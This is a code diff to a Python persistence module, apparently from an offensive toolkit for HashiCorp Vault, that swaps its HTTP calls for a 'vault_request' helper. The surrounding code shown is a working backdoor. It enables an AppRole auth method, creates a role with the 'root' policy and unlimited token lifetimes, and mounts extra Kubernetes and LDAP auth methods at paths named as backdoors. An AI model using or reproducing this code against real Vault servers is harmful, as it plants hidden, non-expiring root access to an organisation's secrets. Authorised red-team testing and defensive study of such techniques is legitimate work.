@@ -1,5 +1,5 @@
 from typing import Optional
-import requests
+from core.tls_config import vault_request
 from ..context import ExecutionContext
 from ..registry import BaseExecutionModule, ExecutionResult, RiskLevel
 
@@ -31,13 +31,13 @@ class MultiPersistenceModule(BaseExecutionModule):
         role_name = params.get("role_name", "multi-backdoor")
         try:
             url = f"{context.vault_addr}/v1/sys/auth/{auth_path}"
-            response = requests.post(url, headers=headers, json={"type": "approle"}, timeout=10)
+            response = vault_request("POST", url, headers=headers, json={"type": "approle"}, timeout=10)
             if response.status_code in [200, 204]:
                 results["approle_enabled"] = True
                 # Role oluştur
                 role_url = f"{context.vault_addr}/v1/auth/{auth_path}/role/{role_name}"
                 role_payload = {"policies": ["root"], "token_ttl": "0", "token_max_ttl": "0"}
-                resp = requests.post(role_url, headers=headers, json=role_payload, timeout=10)
+                resp = vault_request("POST", role_url, headers=headers, json=role_payload, timeout=10)
                 results["approle_role_created"] = resp.status_code in [200, 204]
             else:
                 errors.append(f"AppRole enable failed: {response.status_code}")
@@ -48,7 +48,7 @@ class MultiPersistenceModule(BaseExecutionModule):
         try:
             k8s_path = params.get("k8s_auth_path", "kubernetes-backdoor")
             url = f"{context.vault_addr}/v1/sys/auth/{k8s_path}"
-            response = requests.post(url, headers=headers, json={"type": "kubernetes"}, timeout=10)
+            response = vault_request("POST", url, headers=headers, json={"type": "kubernetes"}, timeout=10)
             if response.status_code in [200, 204]:
                 results["kubernetes_enabled"] = True
             else:
@@ -60,7 +60,7 @@ class MultiPersistenceModule(BaseExecutionModule):
         try:
             ldap_path = params.get("ldap_auth_path", "ldap-backdoor")
             url = f"{context.vault_addr}/v1/sys/auth/{ldap_path}"
-            response = requests.post(url, headers=headers, json={"type": "ldap"}, timeout=10)
+            response = vault_request("POST", url, headers=headers, json={"type": "ldap"}, timeout=10)
             if response.status_code in [200, 204]:
                 results["ldap_enabled"] = True
             else:
